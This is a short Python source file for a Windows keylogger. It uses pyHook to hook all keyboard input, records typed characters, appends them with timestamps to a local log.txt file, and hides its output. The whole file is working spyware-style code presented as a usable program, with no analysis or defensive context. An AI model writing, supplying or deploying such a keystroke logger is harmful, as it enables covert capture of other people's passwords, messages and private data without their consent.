__author__ = 'Gregory'

import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import sys
import os
import time

# hide output
sys.stderr = sys.stdout = os.devnull

# store buffer
class Logger:
    buffer = ''

# hook function
def OnKeyboardEvent(event):
    if event.Ascii != None:
        if event.Ascii in range(32, 127):
            Logger.buffer += chr(event.Ascii)
        elif event.Ascii == 13:
            Logger.buffer += '\n'
            f = open('log.txt', 'a')
            t = time.strftime('%Y.%d.%m.%H:%M:%S')
            f.write(t + ": " + Logger.buffer)
            f.close()

            if 'exitlogger' in Logger.buffer:
                sys.exit(0)

            Logger.buffer = ''

        return 1

# set hook
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
